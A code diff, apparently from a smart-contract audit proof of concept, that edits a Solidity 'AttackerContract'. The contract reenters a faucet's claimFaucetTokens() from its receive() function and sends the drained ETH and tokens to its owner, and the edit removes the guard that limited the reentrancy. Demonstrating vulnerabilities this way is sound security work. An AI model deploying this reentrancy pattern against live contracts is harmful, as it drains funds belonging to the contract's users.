@@ -53,7 +53,6 @@ contract AttackerMainContract is Ownable {
 
 contract AttackerContract {
      IRaiseBoxFaucet immutable raiseBoxFaucet; 
-     bool private stopAttack; 
      address private immutable owner; 
     constructor(address _raiseBoxFauecet) payable{ 
         raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet);
@@ -67,12 +66,10 @@ contract AttackerContract {
         require(ethTransferSuccess, "eth transfer failed"); 
         (bool tokenTransferSuccess) = raiseBoxFaucet.transfer(owner, raiseBoxFaucet.balanceOf(address(this))); 
         require(tokenTransferSuccess, "token transfer failed"); 
-        stopAttack = false; 
     } 
     receive() external payable{ 
-        if(!stopAttack){ 
-            stopAttack = true; 
-            raiseBoxFaucet.claimFaucetTokens(); 
-        } 
+
+        raiseBoxFaucet.claimFaucetTokens(); 
+       
     } 
 }
